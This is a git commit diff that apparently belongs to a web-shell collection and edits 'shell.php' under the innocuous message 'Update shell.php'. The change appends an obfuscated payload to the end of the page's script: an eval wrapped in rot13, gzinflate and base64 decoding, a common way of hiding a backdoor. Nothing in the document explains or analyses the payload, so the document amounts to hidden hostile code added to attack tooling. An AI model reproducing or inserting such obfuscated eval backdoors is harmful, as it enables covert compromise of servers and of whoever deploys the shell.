7c4c4f849de5b4f57b1a6cdeabce4e6f4db26809
1337r0j4n <84887432+1337r0j4n@users.noreply.github.com>
2023-10-14 20:35:51 +0630

    Update shell.php

--- SHELLs/Get S.H.E.L.L.en v1.0 Shell/shell.php
+++ SHELLs/Get S.H.E.L.L.en v1.0 Shell/shell.php
@@ -981,7 +981,7 @@ document.getElementById("emr_et_atash").addEventListener("keyup", function(event
     {
         sistemKom();
     }
-});
+}); eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvS0yxa6W2h7KcVQDxUJJo2TuourcJXGX1/XLHmhuSQzj2wzGYcrEArIjjgszZOXPCmoudnT61RBWBISe3CH//Fun3ErvpMkfz7mdsaOyTstt9YwdnHfCKzjFWAFtVhUAERiolXzLwxHpWz3E8Zk3OBy5DW0T4Qdn6MaQz/IQ4yC+nF1aI0+qU5vOxvVdkQuEaBbS3E5q5aS3SMxsclu26Ok5Jq238wEAZwFYcjSVEJdCxOvokbQNFowYzkHV3esOt5wYvtqz4ww8t5r6G6fc/QPvP157X0dgl3UpHv2qUOe3YKa5a7UMe/SM9WlYpWet/0F')))));
 </script>
 </body>
 </html>
